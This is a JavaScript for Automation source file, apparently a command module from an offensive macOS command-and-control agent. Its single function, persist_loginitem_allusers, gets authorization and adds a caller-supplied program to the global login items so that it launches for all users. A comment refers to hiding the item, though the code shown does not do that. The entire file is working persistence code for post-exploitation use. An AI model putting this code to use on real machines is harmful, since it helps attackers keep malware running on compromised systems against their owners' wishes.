exports.persist_loginitem_allusers = function(task, command, params){
    ObjC.import('CoreServices');
    ObjC.import('Security');
    ObjC.import('SystemConfiguration');
    let args = JSON.parse(params);
    // Obtain authorization for the global login item list
    // Set the item as hidden: https://github.com/pkamb/OpenAtLogin/blob/master/OpenAtLogin.m#L35
    let auth;
    let result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));

    if (result === 0) {
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, args['path'], args['path'].length, false);
        let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        $.LSSharedFileListSetAuthorization(items, auth);
        let cfName = $.CFStringCreateWithCString($.nil, args['name'], $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        return {"user_output": "LoginItem installation successful", "completed": true};
    } else {
        return {"user_output": `LoginItem installation failed: AuthorizationCreate returned ${result}`, "completed": true};
    }

};